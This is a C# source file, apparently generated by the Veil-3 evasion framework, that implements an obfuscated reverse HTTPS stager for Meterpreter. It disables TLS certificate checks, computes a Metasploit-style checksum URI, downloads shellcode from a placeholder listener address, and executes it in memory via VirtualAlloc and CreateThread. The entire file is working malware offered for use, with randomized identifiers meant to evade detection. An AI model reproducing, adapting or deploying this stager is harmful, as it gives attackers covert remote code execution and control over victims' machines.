// generated from Veil-3 Evasive Pure C# reverse https stager... change to your address below
using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading;
namespace xjQqSimmnIFz { public class YmNiEBzRInKffN {
private static bool rKaaDAHoYtrkcjK(object sender, System.Security.Cryptography.X509Certificates.X509Certificate cert,System.Security.Cryptography.X509Certificates.X509Chain chain,System.Net.Security.SslPolicyErrors sslPolicyErrors) { return true; }
static string hNvoDtE(Random r, int s) {
char[] ZuKRJRBpI = new char[s];
string kjGYzK = "dYqD2vagSzV4lPpo1Uk6OwNJ0K7FbcCEtXMQnmhZ3fyIs9exT5Bj8RHAiWLGur";
for (int i = 0; i < s; i++){ ZuKRJRBpI[i] = kjGYzK[r.Next(kjGYzK.Length)];}
return new string(ZuKRJRBpI);}
static bool QShqRy(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) % 0x100 == 92);}
static string pidadEf(Random r) { string MjvmKbXeRIRas = "";
for (int i = 0; i < 64; ++i) { MjvmKbXeRIRas = hNvoDtE(r, 3);
string CLnjcp = new string("g2mrUuZS8h3vfOdyN7sQxVa4M0qlJ6TbtpiLnXGRPEzwIAKkYBcHD15CoF9Wje".ToCharArray().OrderBy(s => (r.Next(2) % 2) == 0).ToArray());
for (int j = 0; j < CLnjcp.Length; ++j) {
string KbPQQg = MjvmKbXeRIRas + CLnjcp[j];
if (QShqRy(KbPQQg)) {return KbPQQg;}}} return "9vXU";}static byte[] JfDAlv(string rBVrjCywiF) {
ServicePointManager.ServerCertificateValidationCallback = rKaaDAHoYtrkcjK;
WebClient PeslzqPVqvX = new System.Net.WebClient();
PeslzqPVqvX.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");
PeslzqPVqvX.Headers.Add("Accept", "*/*");
PeslzqPVqvX.Headers.Add("Accept-Language", "en-gb,en;q=0.5");
PeslzqPVqvX.Headers.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
byte[] hOuTOPAnkGVxE = null;
try { hOuTOPAnkGVxE = PeslzqPVqvX.DownloadData(rBVrjCywiF);
if (hOuTOPAnkGVxE.Length < 100000) return null;}
catch (WebException) {}
return hOuTOPAnkGVxE;}
static void nhdKiVYCLROnBqf(byte[] XLdxAK) {
    if (XLdxAK != null) {
        UInt32 DfMMcajilrzpEgM = VirtualAlloc(0, (UInt32)XLdxAK.Length, 0x1000, 0x40);
        Marshal.Copy(XLdxAK, 0, (IntPtr)(DfMMcajilrzpEgM), XLdxAK.Length);
        IntPtr uMmUbgPCpJVC = IntPtr.Zero;
        UInt32 EJDNFcTskKhne = 0;
        IntPtr PDOCuASsUNtrZQ = IntPtr.Zero;
        uMmUbgPCpJVC = CreateThread(0, 0, DfMMcajilrzpEgM, PDOCuASsUNtrZQ, 0, ref EJDNFcTskKhne);
        WaitForSingleObject(uMmUbgPCpJVC, 0xFFFFFFFF); }}
public YmNiEBzRInKffN(){
Random FntKZExTqHecQy = new Random((int)DateTime.Now.Ticks);
byte[] GSbedkEeKItWO = JfDAlv("https://your.ssl.meterpreter.listener:443/" + pidadEf(FntKZExTqHecQy));
nhdKiVYCLROnBqf(GSbedkEeKItWO);}
[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 FzMVHI,UInt32 pKRhGFLYGMoCYo, UInt32 HcVlhqxK, UInt32 wQTrjeEpsmHS);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 QnPKYNaQkhLuhF, UInt32 ASWvnJvbtwCgn, UInt32 iEPvSWWFOqMS,IntPtr HtbScQcrBzrI, UInt32 cqrWduAQH, ref UInt32 ULhBLXKFVq);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr vRxtNWgXQC, UInt32 ZXSgeJQVYLLqsU);}}
